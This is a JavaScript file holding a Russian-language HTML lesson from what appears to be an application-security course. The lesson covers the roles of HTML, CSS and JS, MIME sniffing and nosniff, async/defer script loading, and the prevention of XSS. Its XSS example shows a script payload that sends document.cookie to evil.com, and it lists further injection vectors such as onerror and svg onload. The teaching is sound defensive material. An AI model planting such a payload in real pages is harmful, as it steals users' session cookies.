/* ---------- m07 · HTML / CSS / JS ---------- */
const V_HTML = `
<section class="view" id="view-html">
  <div class="eyebrow">client · модуль 07 · источники: MDN · WHATWG</div>
  <h1 class="vtitle">HTML, CSS и <span class="accent">JavaScript</span></h1>
  <p class="vlede">Сервер прислал набор файлов. Теперь разберём, что это за файлы и как браузер понимает, что с ними делать. Три технологии делят между собой роли, и понимание границ между ними — прямой путь к пониманию XSS: уязвимость возникает ровно там, где данные пересекают границу и превращаются в код.</p>

  <h2 class="sect">разделение ролей</h2>
  <div class="grid3">
    <div class="card acc-p"><div class="card-t">HTML — структура</div><p class="tx" style="font-size:12px;margin:0">Размечает, что есть на странице: заголовок, абзац, форма, картинка. Это <span class="hl">скелет</span>. Не язык программирования: в нём нет ни условий, ни циклов — только разметка.</p></div>
    <div class="card acc-c"><div class="card-t">CSS — оформление</div><p class="tx" style="font-size:12px;margin:0">Описывает, как это выглядит: цвета, шрифты, отступы, раскладка, анимации. Тоже не язык программирования, а язык правил: «элементам такого вида — такой стиль».</p></div>
    <div class="card acc-a"><div class="card-t">JavaScript — поведение</div><p class="tx" style="font-size:12px;margin:0">Полноценный язык программирования, исполняемый браузером. Может менять HTML и CSS на лету, слать запросы, читать cookies, реагировать на события. <span class="rd">И именно поэтому он — главная цель атакующего.</span></p></div>
  </div>

  <div class="ascii"><span class="h">ОДНА И ТА ЖЕ КНОПКА В ТРЁХ СЛОЯХ</span>

  <span class="p">HTML</span>  &lt;button id="buy"&gt;Купить&lt;/button&gt;          <span class="f">← что это такое</span>

  <span class="h">CSS</span>   #buy { background: #38bdf8;             <span class="f">← как выглядит</span>
          border-radius: 6px; }

  <span class="a">JS</span>    document.getElementById('buy')          <span class="f">← что делает</span>
          .addEventListener('click', pay)</div>

  <h2 class="sect">откуда браузер знает, что это за файл</h2>
  <p class="tx">Ключевой момент, который многие пропускают: <span class="hl">браузер определяет тип файла не по расширению, а по заголовку <code class="ic">Content-Type</code></span> в HTTP-ответе. Расширение в URL — это просто часть пути, сервер может отдавать что угодно под каким угодно именем.</p>
  <div class="code"><span class="code-label">MIME types</span><span class="fn">Content-Type</span>: text/html<span class="cmt">                 → разобрать как HTML и отрисовать</span>
<span class="fn">Content-Type</span>: text/css<span class="cmt">                  → применить как стили</span>
<span class="fn">Content-Type</span>: application/javascript<span class="cmt">   → выполнить как код</span>
<span class="fn">Content-Type</span>: application/json<span class="cmt">          → отдать как данные, НЕ выполнять</span>
<span class="fn">Content-Type</span>: image/png<span class="cmt">                 → показать картинку</span>
<span class="fn">Content-Type</span>: text/plain<span class="cmt">                → показать как текст</span></div>

  <div class="sec-box">
    <div class="sb-t">SEC ▸ MIME sniffing и почему нужен nosniff</div>
    <p class="tx">Исторически браузеры «угадывали» тип, если сервер прислал неверный или отсутствующий <code class="ic">Content-Type</code>: заглядывали в начало файла и решали сами. Это называется <span class="cy">MIME sniffing</span>, и это дыра. Классика: пользователь загружает на сайт «аватарку» <code class="ic">avatar.png</code>, внутри которой лежит HTML со скриптом. Сервер отдаёт её как <code class="ic">text/plain</code> или без типа, браузер принюхивается, видит теги и <span class="rd">решает разобрать как HTML</span> — получаем stored XSS из картинки.</p>
    <p class="tx" style="margin-bottom:0">Лечится одной строкой: <code class="ic">X-Content-Type-Options: nosniff</code> — «верь моему Content-Type и не выдумывай». Плюс правильный тип для загруженных файлов и отдача пользовательского контента с отдельного домена. Подробнее в модуле 16.</p>
  </div>

  <h2 class="sect">как HTML попадает на страницу — и где рождается XSS</h2>
  <p class="tx">Браузер читает HTML сверху вниз и строит из него дерево объектов. Когда он встречает <code class="ic">&lt;script&gt;</code>, он <span class="hl">исполняет содержимое</span>. Ему всё равно, откуда этот тег взялся: написал его разработчик или он приехал из поля комментария вместе с пользовательскими данными.</p>
  <div class="code"><span class="code-label">откуда берётся XSS</span><span class="cmt">// сервер вставляет ник пользователя в шаблон:</span>
&lt;div&gt;Привет, <span class="op">{{ username }}</span>!&lt;/div&gt;

<span class="cmt">// пользователь назвался вот так:</span>
username = <span class="st">"&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;"</span>

<span class="cmt">// браузер получает и честно ИСПОЛНЯЕТ:</span>
&lt;div&gt;Привет, <span class="kw">&lt;script&gt;</span>fetch('//evil.com?c='+document.cookie)<span class="kw">&lt;/script&gt;</span>!&lt;/div&gt;</div>
  <p class="tx">Вот и весь механизм XSS в одном примере. Данные пересекли границу и стали кодом. Защита — не «фильтровать плохие слова», а <span class="hl">экранировать данные под тот контекст, куда они попадают</span>: в HTML-тексте одни правила, в атрибуте — другие, внутри JS — третьи, в URL — четвёртые. Отсюда любимый вопрос интервьюеров про context-aware encoding.</p>

  <h2 class="sect">как подключают скрипты — и почему это важно</h2>
  <p class="tx">Три способа подключить внешний скрипт ведут себя по-разному, и разница влияет и на скорость, и на безопасность.</p>

  <div class="lab">
    <div class="lab-head"><span class="live-dot"></span>script-loading.live · обычный vs async vs defer</div>
    <div class="lab-body">
      <p class="tx" style="font-size:12px;margin-bottom:12px">Переключай режим загрузки — увидишь на таймлайне, когда парсинг HTML останавливается и когда исполняется код:</p>
      <div id="htmlLab"></div>
    </div>
  </div>

  <div class="twrap"><table class="t">
    <tr><th>Форма</th><th>Загрузка</th><th>Исполнение</th><th>Порядок гарантирован</th></tr>
    <tr><td><code class="ic">&lt;script src&gt;</code></td><td>останавливает парсинг</td><td>сразу после загрузки, парсер ждёт</td><td class="gs">да</td></tr>
    <tr><td><code class="ic">&lt;script async src&gt;</code></td><td>параллельно парсингу</td><td>как только скачался — прерывает парсинг</td><td class="rd">нет</td></tr>
    <tr><td><code class="ic">&lt;script defer src&gt;</code></td><td>параллельно парсингу</td><td>после полного разбора документа, перед DOMContentLoaded</td><td class="gs">да</td></tr>
    <tr><td><code class="ic">&lt;script&gt;код&lt;/script&gt;</code></td><td>—</td><td>немедленно, при разборе</td><td class="gs">да</td></tr>
  </table></div>
  <p class="tx" style="font-size:12px">Важно: <code class="ic">async</code> и <code class="ic">defer</code> <span class="hl">не работают на инлайновых скриптах</span> — только там, где есть <code class="ic">src</code>.</p>

  <div class="card acc-p">
    <div class="card-t">◇ зачем это AppSec</div>
    <p class="tx" style="margin:0">Момент исполнения определяет, что скрипт видит в DOM. Скрипт в <code class="ic">&lt;head&gt;</code> без атрибутов выполняется раньше, чем построено тело страницы, — он не найдёт элементы и не сможет их «почистить». Именно поэтому санитайзеры и защитные обёртки подключают синхронно и первыми, а аналитику и виджеты — через <code class="ic">async</code>. И именно поэтому DOM-based XSS часто зависит от тайминга: payload успевает сработать до того, как загрузится код, который должен был его нейтрализовать.</p>
  </div>

  <h2 class="sect">что умеет JavaScript в странице</h2>
  <p class="tx">Полезно один раз осознать масштаб полномочий. Скрипт, исполняющийся в контексте страницы, может:</p>
  <div class="chips">
    <span class="chip">читать и менять весь DOM</span>
    <span class="chip">читать cookies без HttpOnly</span>
    <span class="chip">читать localStorage и sessionStorage</span>
    <span class="chip">слать запросы от имени пользователя</span>
    <span class="chip">перехватывать ввод с клавиатуры</span>
    <span class="chip">читать содержимое форм</span>
    <span class="chip">подменять содержимое страницы</span>
    <span class="chip">открывать окна и фреймы</span>
    <span class="chip">обращаться к камере и микрофону (с разрешения)</span>
  </div>
  <p class="tx">Отсюда следует главное: <span class="rd">любой сторонний скрипт на странице имеет ровно те же права, что и твой собственный код</span>. Браузер не различает «наш скрипт» и «скрипт из рекламной сети». Виджет чата, счётчик аналитики, библиотека с CDN — каждый из них может сделать всё перечисленное выше. Это и есть модель угроз supply chain, ставшая A03 в OWASP Top 10:2025.</p>

  <div class="ask-box">
    <div class="sb-t">на собесе спросят</div>
    <div class="q">— Почему нельзя просто «отфильтровать теги &lt;script&gt;» для защиты от XSS?</div>
    <div class="a">Потому что исполнение кода в HTML не ограничивается тегом script: есть обработчики событий (<code class="ic">onerror</code>, <code class="ic">onload</code>, <code class="ic">onmouseover</code>), схема <code class="ic">javascript:</code> в ссылках, <code class="ic">&lt;svg onload&gt;</code>, <code class="ic">&lt;iframe srcdoc&gt;</code>, <code class="ic">&lt;object data&gt;</code> и десятки других векторов. Блеклист принципиально не полон. Правильная модель — не искать плохое, а <span class="hl">экранировать всё под конкретный контекст вывода</span> и использовать проверенные шаблонизаторы, которые делают это по умолчанию.</div>
    <div class="q">— В чём принципиальная разница между HTML-, SQL- и command-инъекциями?</div>
    <div class="a">Механика одна и та же: данные попадают в интерпретатор, который трактует их как код. Меняется только интерпретатор — браузер, СУБД, командная оболочка. Поэтому и защита однотипна по идее: <span class="hl">отделить код от данных</span>. В SQL — параметризованные запросы, в HTML — контекстное экранирование, в shell — передача аргументов массивом вместо конкатенации строки. Ответ «валидировать ввод» неполный: валидация помогает, но не заменяет разделение кода и данных.</div>
  </div>

  <h2 class="sect">референсы модуля</h2>
  <a class="ref" href="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script" target="_blank" rel="noopener"><span class="r-t">MDN — the script element</span><span class="r-d">формальная семантика async и defer, поведение парсера.</span><span class="r-u">developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script</span></a>
  <a class="ref" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types" target="_blank" rel="noopener"><span class="r-t">MDN — MIME types</span><span class="r-d">полный список типов и раздел про MIME sniffing.</span><span class="r-u">developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types</span></a>
  <a class="ref owasp" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="r-t">OWASP — XSS Prevention Cheat Sheet</span><span class="r-d">каноническая таблица «в каком контексте как экранировать». Обязательно к прочтению.</span><span class="r-u">cheatsheetseries.owasp.org/.../Cross_Site_Scripting_Prevention_Cheat_Sheet.html</span></a>
  <a class="ref" href="https://html.spec.whatwg.org/multipage/parsing.html" target="_blank" rel="noopener"><span class="r-t">WHATWG HTML — Parsing</span><span class="r-d">как именно браузер разбирает разметку. Тяжело, но именно тут ответы на вопросы «а почему этот payload сработал».</span><span class="r-u">html.spec.whatwg.org/multipage/parsing.html</span></a>

  <div class="btn-row" style="margin-top:26px">
    <button class="btn" onclick="markDone('html');go('browser')">[✓] завершить → браузер изнутри</button>
  </div>
</section>`;
